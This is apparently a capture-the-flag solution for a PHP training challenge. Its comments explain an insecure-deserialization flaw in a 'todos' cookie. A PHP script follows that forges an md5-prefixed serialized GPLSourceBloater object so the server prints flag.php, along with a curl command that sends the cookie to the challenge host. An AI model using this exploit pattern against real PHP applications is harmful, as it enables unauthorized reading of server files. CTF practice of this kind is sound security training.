/*

We know flag is at flag.php
Server code for the main page is leaked in ?source

In the html body, its echo-ing every todo in the todos list
    - <?=$todo?> is like doing <?php echo $todo; ?>

The GPLSourceBloater can be used to print files
    - Always prints licence.txt using highlight_file(filepath, true)
    - But also $this->source using highlight_file(filepath, true)
    - We can set this source to flag.php

The cookies are checked for 'todos'
    - the first 32 chars is the hash of the content calculated with md5(data)
    - the rest is unserialized as the todos array

So:
    - Create a GPLSourceBloater with source = "flag.php"
    - Make an array with the previous object
    - Serialize the array
    - Hash the serialized array with md5
    - Cookie is the hash + serialized array
    - Need to encode for url

Exploit:
curl -v --cookie "todos=[output of this script]" http://free.training.jinblack.it >> site.html

Or just set the cookie in the browser
*/

<?php
Class GPLSourceBloater{
    // The class content can actually be omitted, we just need the class name as the server will use its local class
    /*
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
    */
}

$s = new GPLSourceBloater();
$s->source = "flag.php";

$todos = [$s];
$s_todos = serialize($todos);
$hash = md5($s_todos);

$cookie = urlencode($hash . $s_todos);
echo $cookie . "\n";

?>
